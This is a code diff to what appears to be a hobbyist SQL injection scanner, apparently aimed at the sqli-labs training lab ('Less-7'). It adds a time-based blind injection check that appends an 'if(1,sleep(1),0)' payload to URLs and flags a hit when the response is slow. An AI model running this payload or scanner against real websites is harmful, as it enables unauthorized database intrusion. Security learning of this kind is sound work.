@@ -9,6 +9,7 @@ from userdata import Global_UserData
 from myhttp import HTTP
 from inj_union import InjUnion
 from inj_err import InjError
+from inj_time import InjTime
 
 print('我被打印了_Scanner.py')
 
@@ -84,14 +85,16 @@ class UrlInjector(HTTP):
         self.Print(f"{code=},{newlen=},{self.new_time}【{self._url % '1'}】")
         for url_end in Global_UserData['inj_type']:
             # 循环构造 注入点
-            url = self._url % url_end + ' and if(1,sleep(0.4),0)--+'
+            url = self._url % url_end + ' and if(1,sleep(1),0)--+'
 
             # 查询新时间
             newlen, code = self.GET(url)
             print(f'>>>{self._threadname}：{code=},{newlen=},{self.new_time}【{url}】')
 
-            # 如果时间相减毫秒数＞900
-            if (self.new_time - self.old_time) * 1000 > 300:
+            # 如果产生sleep，则表示注入成功
+            if (self.new_time - self.old_time) * 1000 > 900:
+                if '注入方式' not in self._inj_info:
+                    self._inj_info['注入方式'] = {}
                 self._inj_info['注入方式']['基于时间盲注'] = self._url % url_end
                 break
             pass
@@ -103,7 +106,7 @@ class UrlInjector(HTTP):
         self._lock = Lock
         self._threadname = ThreadName
         self._url = Url
-        if 'Less-7' in Url:
+        if 'Less-7' not in Url:
             return
 
         self.Print(f'扫描器传入 {Url=}')
@@ -127,6 +130,8 @@ class UrlInjector(HTTP):
                 self._InjError = InjError(
                     self._lock, self._threadname, self._inj_info)
             elif "基于时间盲注" in inj_urls:
+                self._InjTime = InjTime(
+                    self._lock, self._threadname, self._inj_info)
                 pass
             pass
 
